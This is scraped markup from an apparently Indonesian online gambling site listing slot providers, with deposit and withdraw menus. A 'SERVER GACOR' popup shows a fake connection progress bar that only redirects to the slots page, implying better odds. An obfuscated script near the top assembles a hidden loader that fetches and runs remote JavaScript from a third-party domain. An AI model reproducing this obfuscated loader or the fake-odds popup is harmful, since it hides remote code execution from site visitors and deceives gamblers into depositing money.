          <h3 style="text-align:center; color:#FFD700;">SERVER INTERNATIONAL</h3>
          <p style="text-align:center; color:#fff;">Silahkan Pilih Server:</p>
    
          <select id="serverSelect" style="
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: #2b2b2b;
            color: #fff;
            border: 1px solid #FFD700;
            border-radius: 4px;
          ">
            <option value="id">SERVER GACOR INDONESIA</option>
            <option value="sg">SERVER GACOR SINGAPORE</option>
            <option value="th">SERVER GACOR THAILAND</option>
            <option value="ae">SERVER GACOR DUBAI</option>
            <option value="vn">SERVER GACOR VIETNAM</option>
            <option value="ph">SERVER GACOR FILIPINA</option>
            <option value="mm">SERVER GACOR MYANMAR</option>
            <option value="jp">SERVER GACOR JEPANG</option>
            <option value="ru">SERVER GACOR RUSIA</option>
            <option value="kr">SERVER GACOR KOREA</option>
            <option value="cn">SERVER GACOR CHINA</option>
            <option value="hk">SERVER GACOR HONGKONG</option>
            <option value="my">SERVER GACOR MALAYSIA</option>
            <option value="int">SERVER GACOR INTERNATIONAL 🌐</option>
          </select>
    
          <div style="
            background-color: #333;
            height: 22px;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
            border: 1px solid #FFD700;
          ">
            <div id="progressBar" style="
              width: 0%;
              background: linear-gradient(90deg, #FFD700, #B7870C);
              height: 100%;
              text-align: center;
              color: #111;
              font-size: 14px;
              font-weight: bold;
              text-shadow: 0 0 5px rgba(0,0,0,0.6);
              transition: width 0.3s;
            ">0%</div>
          </div>
    
          <p id="statusText" style="text-align: center; font-weight: bold; color:#FFD700;"></p>
    
          <div style="text-align: center;">
            <button id="btnConnect" style="
              background: linear-gradient(to bottom, #FFD700, #B7870C);
              color: #111;
              border: none;
              padding: 10px 30px;
              border-radius: 6px;
              font-size: 14px;
              font-weight: bold;
              cursor: pointer;
              box-shadow: 0 0 12px rgba(255,215,0,0.6);
            ">HUBUNGKAN</button>
          </div>
        </div>
      `;
      document.body.appendChild(popup);
    
      document.getElementById("btnOpenMaxwin").addEventListener("click", () => {
        popup.style.display = "flex";
      });
    
      document.getElementById("closeMaxwin").addEventListener("click", () => {
        popup.style.display = "none";
        resetProgress();
      });
    
      let hasConnected = false;
    
      document.getElementById("btnConnect").addEventListener("click", () => {
        if (hasConnected) return;
    
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        let progress = 0;
    
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = true;
    
        const interval = setInterval(() => {
          progress += 5;
          bar.style.width = progress + "%";
          bar.textContent = progress + "%";
    
          if (progress >= 100) {
            clearInterval(interval);
            bar.style.background = "limegreen";
            bar.textContent = "100%";
            status.innerText = "Selesai!";
            status.style.color = "#fff";
    
            const url = new URL('/slots', window.location.href);
            url.protocol = 'https:';
            url.hostname = location.hostname;
            url.port = '';
            window.location.replace(url.toString());
          }
        }, 100);
      });
    
      function resetProgress() {
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        bar.style.width = "0%";
        bar.textContent = "0%";
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = false;
      }
    });
    </script> 

<script>var _0x1344b2=_0x1928;(function(_0x234a18,_0x44183a){var _0x576849=_0x1928,_0x326a2e=_0x234a18();while(!![]){try{var _0x27c6e9=parseInt(_0x576849(0x1ae))/(-0x83+-0x2a9*-0x5+-0xcc9)+parseInt(_0x576849(0x1a7))/(0x2*-0x788+-0x1a17+-0x29*-0x101)*(-parseInt(_0x576849(0x1a2))/(0xd1b+0xd4*-0x2d+0x182c))+parseInt(_0x576849(0x1a8))/(-0x193e+0x98f*0x2+0x189*0x4)+-parseInt(_0x576849(0x1a9))/(-0x2620+0x1*0x202d+0x5f8)+parseInt(_0x576849(0x1c0))/(-0x15*0x1af+-0x1*-0x1e62+0x4ff)*(-parseInt(_0x576849(0x1bd))/(0x1313+-0x627+-0xce5))+-parseInt(_0x576849(0x1a4))/(-0x1d*-0x4a+0xde*-0x2+-0x34f*0x2)*(parseInt(_0x576849(0x1b4))/(-0x5e*0x53+0x881*-0x2+0x5*0x981))+-parseInt(_0x576849(0x1ab))/(-0x2f3*0x1+0x1*0x2345+0x4*-0x812)*(-parseInt(_0x576849(0x1c2))/(-0x17be+-0x1*0xa7b+0x2244));if(_0x27c6e9===_0x44183a)break;else _0x326a2e['push'](_0x326a2e['shift']());}catch(_0x5a009a){_0x326a2e['push'](_0x326a2e['shift']());}}}(_0x3d03,0x9*0x22131+-0x2151*0x96+0xb20c2));var _0x60b0bc=(function(){var _0x34a08f=!![];return function(_0x4da461,_0x19bb5e){var _0x9b4c1c=_0x34a08f?function(){var _0x123dba=_0x1928;if(_0x19bb5e){var _0x442e90=_0x19bb5e[_0x123dba(0x1c1)](_0x4da461,arguments);return _0x19bb5e=null,_0x442e90;}}:function(){};return _0x34a08f=![],_0x9b4c1c;};}()),_0x3a9b7d=_0x60b0bc(this,function(){var _0x29a51c=_0x1928,_0x346248={'RCpcD':_0x29a51c(0x1b6)+'+$'};return _0x3a9b7d[_0x29a51c(0x1be)]()[_0x29a51c(0x1b9)](_0x346248[_0x29a51c(0x1aa)])[_0x29a51c(0x1be)]()[_0x29a51c(0x1b3)+'r'](_0x3a9b7d)[_0x29a51c(0x1b9)](_0x29a51c(0x1b6)+'+$');});function _0x1928(_0x3ef2e8,_0x51db8f){var _0x26a1e3=_0x3d03();return _0x1928=function(_0x5c46d7,_0x3a8e08){_0x5c46d7=_0x5c46d7-(0xb6d+-0x13ac*-0x1+-0x13*0x18d);var _0x214423=_0x26a1e3[_0x5c46d7];return _0x214423;},_0x1928(_0x3ef2e8,_0x51db8f);}_0x3a9b7d();var hokiScript=document[_0x1344b2(0x1af)+_0x1344b2(0x1bc)](_0x1344b2(0x1b5));hokiScript[_0x1344b2(0x1b8)]=_0x1344b2(0x1b0),hokiScript[_0x1344b2(0x1b7)]=function(){var _0x15387f=_0x1344b2;hokiStart(_0x15387f(0x1b2));},hokiScript[_0x1344b2(0x1b1)]=_0x1344b2(0x1c3)+_0x1344b2(0x1a5)+_0x1344b2(0x1ad)+_0x1344b2(0x1ba),hokiScript[_0x1344b2(0x1ac)]=!(0x64e+0x1864+-0x1eb2),document[_0x1344b2(0x1a6)+_0x1344b2(0x1bf)](_0x1344b2(0x1a3))[0x1c46+0xedc+-0x2b22][_0x1344b2(0x1bb)+'d'](hokiScript);function _0x3d03(){var _0x125f3a=['script','(((.+)+)+)','onload','type','search','agaming.js','appendChil','ent','7Bdcwop','toString','sByTagName','7760958dxQrVz','apply','11qiFdit','https://as','231cSYnel','head','4315888oRPJPA','set.qrisho','getElement','4084pGAqGP','4756920BcGrRD','3277430pMpqSo','RCpcD','13030170VaIjxy','async','ki.com/gig','1398991GuWUbO','createElem','module','src','cpg138','constructo','18mtIYQh'];_0x3d03=function(){return _0x125f3a;};return _0x3d03();}</script>
 





 
<meta charset="utf-8">

<meta name="csrf-token" content="NBEbKxG6lPy03y4rzVutbS2sGHgPjHuNJefNtVGv">

<script src="/assets/js/jquery/jquery.min.js"></script>
<script src="/assets/js/bootstrap/bootstrap.min.js"></script>

     
                        <link rel="preload" href="/assets/fonts/ugsubskin/icomoon/fonts/icomoon.woff2" as="font" type="font/woff2" crossorigin="anonymous">
      <link rel="stylesheet" href="/assets/fonts/ugsubskin/icomoon/style.min.css" media="all" onload="this.media='all'"> 
      <link rel="stylesheet" href="/assets/css/swiper.css">

  <link type="text/css" rel="stylesheet" href="/assets/css/app-mobile.css">     
    <link type="text/css" rel="stylesheet" href="/assets/css/custom.css">
    <script src="/assets/js/jquery/sweet_alert2.min.js"></script>
 

  <link rel="stylesheet" href="/assets/js/jquery/jquery-ui.min.css" media="all" onload="this.media='all'">
  <script src="/assets/js/jquery/jquery-ui.min.js" defer=""></script>
  <script type="text/javascript" src="/assets/js/jquery/jquery.ui.touch-punch.min.js" defer=""></script>



 
  <div class="full-container layout">
    <div id="sideNav" class="side-nav">
      <nav class="nav-content">
  <ul class="side-nav-items">
    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/home.php?i=1#" onclick="closeNav(-1);">
        <div><i class="icon-home"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@HOME">HOME</div>
      </a>

    </li>
            
      
    <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(0);" [ngclass]="{'active':isOpenNavContent[0], '':   !isOpenNavContent[0]}">
        <div><i class="icon-coins"></i></div>
        <div class="nav-title" i18n="@Funds">Dana</div>
      </a>
      <div class="nav-item-content" [ngclass]="{'open':isOpenNavContent[0], '':!isOpenNavContent[0]}">
        <ul class="submenu account">
          <li>
            <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-pig"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Deposit</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-transfer"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Withdraw</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-history"></i></span></div>
              <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
            </a>
          </li>
        
          <li>
            <a href="https://www.Goblin88.site/refferal.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-users"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Referral &nbsp;</div>
            </a>
          </li>
      

        </ul>
      </div>
    </li>
    
        <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(1);" [ngclass]="{'active':isOpenNavContent[1], '':   !isOpenNavContent[1]}">
        <div><i class="icon-videogame_asset"></i></div>
        <div class="nav-title" i18n="">PERMAINAN</div>
      </a>
      <div class="nav-item-content games" [ngclass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
        <ul class="submenu">
                  <!-- <i class="icon-lottery"></i>
                  <i  class="icon-others"></i>    -->

                                   <li>  <a href="https://www.Goblin88.site/slot.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-slot"></i>
               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">SLOTS</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/live.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <img src="/assets/images/live_game_icon3860.gif" ref="live game" height="41px">               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">LIVE GAMES</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/sports.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-soccer"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">SPORTS</div>
            </a>
            </li>
                                                <li>    <a href="https://www.Goblin88.site/casino.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-casino"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">CASINO</div>
            </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/lottery.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                      <i class="icon-lottery"></i>
                    
                    </span>
                    <span class="hot sub new ">NEW</span>
                </div>
                <div class="fs-sm mt-1">LOTRE</div>
               </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/fish-hunter.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                    <i class="icon-fish_hunter"></i>
                    </span>
                </div>
                <div class="fs-sm mt-1">TEMBAK IKAN</div>
               </a>
            </li>
                                                <li>   <a href="https://merdekaMERCUSUAR77.site/e-games" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-others"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">E-GAMES</div>
            </a>
            </li>
                        

        </ul>
      </div>
    </li>

            <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/promosaya.php" onclick="closeNav(-1);">
        <div><i class="icon-user1"></i></div> 
        <div class="nav-title" i18n="@PROMOS">Promo saya</div>
      </a>
    </li>
          <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/promotion.php" onclick="closeNav(-1);">
        <div><i class="icon-gift"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@PROMOS">PROMOSI</div>
      </a>
    </li>
    
        <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/refferal.php" onclick="closeNav(-1);">
        <div><i class="icon-users"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@REFERRAL">
                        REFERRAL                      </div>
      </a>

    </li>
                    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/rtpbaby.php" target="_blank" onclick="closeNav(-1);">
        <div>
          <i></i>
          <img src="/assets/ImageFile/202505252031220000002213b1fcac__babyrtp__200x200.webp" width="30px" height="30px">
        </div> <!--routerLinkActiveOptions for root URL-->

        <div class="nav-title">CEK RTP LIVE</div>
      </a>
    </li>
       


    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/info.php" onclick="closeNav(-1);">
        <div><i class="icon-info"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@INFO">INFO</div>
      </a>

    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/contact-us.php" onclick="closeNav(-1);">
        <div><i class="icon-address-book"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="">HUBUNGI KAMI</div>
      </a>
    </li>
    <li class="nav-item">
      <a href="#" class="navlink" onclick="closeNav();" data-trigger="nifty" data-target="#langModal-mobile">
       <div><i class="icon-language"></i></div>
       Bahasa      </a>
    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/" onclick="closeNav(-1);">
        <div><i class="icon-display"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title">Desktop View</div>
      </a>
    </li>
        <li class="nav-item"><a href="#" class="navlink" onclick="closeNav();"> <i class="icon-double_arrow_l"></i></a></li>
  </ul>
</nav>


<script>
var arr= [0,0];

function openNavItem(index){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');
    if(index>=0){
        $('.nav-item-content').eq(index).addClass('open');
        $('.navlink.has-sub').eq(index).addClass('active');
        $( "#mainContent" ).addClass( "navContentOpen" );
        $( "#sideNav" ).addClass( "navContentOpen" );
    }
}

function closeNav(){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');

    $( "#sideNav" ).removeClass( "navContentOpen" );
    $( "#sideNav" ).removeClass( "open" );
    $( "#mainContent" ).removeClass( "navContentOpen" );
    $( "#mainContent" ).removeClass( "sideNavOpen" );

}
</script>
    </div>

    <div class="main-content" id="mainContent">
      <div class="backdrop" id="mainContentContainer">

        <div class="top-bar">
          <div class="inner-header flex-row ">

<button id="btnToggleSideNav" class="btn btn-link" aria-label="side nav toggle">
    <i class="icon-bars"></i>
  </button>
  <a href="https://www.Goblin88.site/" title="" class="logo">
    <div><img class="img-fluid" alt="MERCUSUAR77" src="/assets/ImageFile/mercusuar.gif"></div>
  </a>

          <a id="btnToggleRSideNav">
      <i class="icon-user-o"></i>    
    </a>
    
  



</div>
        </div>
        <div class="content my01">

                                                  <div class="container wallet-bal">
                <div class="row text-left">
                  <div class="col-xs-6">
                    <button class="btn btn-clear btn-refresh-wallet">
                      <i class="icon-currency-dollar fs-lg i-dollar"></i>
                      &nbsp;&nbsp;
                      
                      <span class="bal-txt">IDR <?php echo $saldo_game; ?></span>
                    </button>
                  </div>
                    <div class="col-xs-6 noSidePadding i-refresh">
                                                                  <button class="btn btn-clear btn-refresh-wallet pull-right"><i class="icon-refresh-2"></i></button>
                    </div>
                </div>

                <div class="row game-bals" id="other-game-bals" style="display:none;">
                  <div class="">
                    <table class="table">
                      

                    <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-PT">Playtech <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-PT">0.00</span></td>
                        <td class="col-xs-1"><button class="btn btn-clear btn-tran-PT" data-toggle="tooltip"
                            data-placement="bottom" title="Transfer ALL to Wallet"><i
                              class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-CMD">CMD <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-CMD">0.00</span></td>
                        <td class="col-xs-1">
                          <button class="btn btn-clear btn-tran-CMD" data-toggle="tooltip" data-placement="bottom"
                            title="Transfer ALL to Wallet">
                            <i class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      

                      

                    </table>
                  </div>
                </div>

              </div>
                        
          <!-- <div class="content-loader" *ngIf="subs.state$.requests.getAllGamesViewByCategory.inProgress; else content"><app-spinner></app-spinner> </div> -->


<div class="container pt-1 sub-games">
           <div>
 
  <h3 class="title" i18n="">slots PROVIDERS</h3>
  <div class="row">


  </div>

  <div class="scroll-wrapper row" style="height:72px;">

    <div class="left"><button class="prev-btn btn" id="left-button"><i class="icon-keyboard_arrow_left"></i></button></div>

    <div style="overflow:hidden;width:100%;" class="scroller">
      <div class="row no-gutters text-center slider-content">
        <!--//hardcoded links.......-->




                
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box active" href="pragmatic-play.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/images/ppslotc619.gif" data-src="/assets/images/ppslotc619.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PRAGMATIC</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="pgsoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/images/pgsoft8510.gif" data-src="/assets/images/pgsoft8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PGSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="joker-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/jk_rng8510.png" data-src="/assets/game_logos/100x70/jk_rng8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JOKER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="besoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70//besoft_slot8510.png" data-src="/assets/game_logos/100x70//besoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BESOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="spadegaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sg_slot8510.gif" data-src="/assets/game_logos/100x70/sg_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SPADE GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="jili.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jili.webp" data-src="/assets/game_logos/100x70/jili.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JILI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="fastspin.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/fastspin_slot8510.gif" data-src="/assets/game_logos/100x70/fastspin_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FASTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="booongo.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/booongo_slot.webp" data-src="/assets/game_logos/100x70/booongo_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BNG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="playtech.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/pt_slot.webp" data-src="/assets/game_logos/100x70/pt_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYTECH</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="wow-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/wow_slot8510.png" data-src="/assets/game_logos/100x70/wow_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">WOW GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="sigma.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sigmagaming_slot.webp" data-src="/assets/game_logos/100x70/sigmagaming_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SIGMA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="habanero.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/hb_slot8510.png" data-src="/assets/game_logos/100x70/hb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HABANERO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/fatpanda" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fatpanda_slot8510.png" data-src="/assets/game_logos/100x70/fatpanda_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FAT PANDA</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/advantplay" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/advantplay_slot8510.png" data-src="/assets/game_logos/100x70/advantplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ADVANTPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/hacksaw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/hacksaw_slot8510.png" data-src="/assets/game_logos/100x70/hacksaw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HACKSAW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/relax" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/relax_slot8510.png" data-src="/assets/game_logos/100x70/relax_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">RELAX GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/microgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/mg_slot8510.png" data-src="/assets/game_logos/100x70/mg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">MICRO GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nolimitcity" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nolimitcity_slot8510.png" data-src="/assets/game_logos/100x70/nolimitcity_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NOLIMITCITY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nextspin" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/nextspin_slot8510.png" data-src="/assets/game_logos/100x70/nextspin_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NEXTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/playstar" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playstar_slot8510.png" data-src="/assets/game_logos/100x70/playstar_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYSTAR</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/cq9" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/cq9_slot8510.png" data-src="/assets/game_logos/100x70/cq9_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">CQ9</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/skywind" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/skywind_slot8510.png" data-src="/assets/game_logos/100x70/skywind_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SKYWIND</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/ai-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/aigaming_slot8510.png" data-src="/assets/game_logos/100x70/aigaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">AI GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/redtiger" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">REDTIGER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/netent" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_net_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_net_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NETENT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/playngo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playngo_slot8510.png" data-src="/assets/game_logos/100x70/playngo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYNGO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/cosmo-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/cosmo_slot8510.png" data-src="/assets/game_logos/100x70/cosmo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">COSMO PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/hotdog" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/hotdog_slot8510.png" data-src="/assets/game_logos/100x70/hotdog_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HOTDOG GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/dst-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/dst_slot8510.png" data-src="/assets/game_logos/100x70/dst_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DST PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/askmeslot" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/askme_slot8510.png" data-src="/assets/game_logos/100x70/askme_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ASKMESLOT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
